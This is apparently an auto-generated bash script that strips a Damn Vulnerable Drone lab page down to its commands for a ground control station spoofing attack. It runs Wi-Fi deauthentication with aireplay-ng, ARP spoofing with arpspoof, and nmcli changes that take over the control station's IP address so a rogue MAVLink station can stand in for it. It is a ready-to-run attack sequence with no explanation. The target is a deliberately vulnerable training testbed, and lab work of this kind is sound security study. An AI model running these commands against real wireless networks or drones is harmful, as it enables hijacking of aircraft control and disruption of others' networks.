#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Ground-Control-Station-Spoofing.md
# Created: 2025-11-23 16:46:38
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=ground-control-station-spoofing src=Ground-Control-Station-Spoofing.md"
log "[BLOCK 1] type=shell"
sudo aireplay-ng --deauth 0 -a <AP_MAC> -c <GCS_MAC> wlan0mon

log "[BLOCK 2] type=shell"
wget https://s3-us-west-2.amazonaws.com/qgroundcontrol/latest/QGroundControl.AppImage
chmod +x QGroundControl.AppImage
./QGroundControl.AppImage

log "[BLOCK 3] type=shell"
mavproxy.py

log "[BLOCK 4] type=shell"
ifconfig wlan0

log "[BLOCK 5] type=shell"
sudo arpspoof -i wlan0 -t ${TARGET_CC_WIFI}4 -r ${TARGET_CC_WIFI}

log "[BLOCK 6] type=shell"
nmcli connection modify "Drone_Wifi" ipv4.method manual \
ipv4.addresses ${TARGET_CC_WIFI}4/24 \
ipv4.gateway ${TARGET_CC_WIFI} \
ipv4.dns "8.8.8.8 8.8.4.4"

log "[BLOCK 7] type=shell"
nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"

log "[BLOCK 8] type=shell"
nmcli connection modify "Drone_Wifi" ipv4.method manual \
ipv4.addresses ${TARGET_CC_WIFI}0/24 \
ipv4.gateway ${TARGET_CC_WIFI} \
ipv4.dns "8.8.8.8 8.8.4.4"
nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"

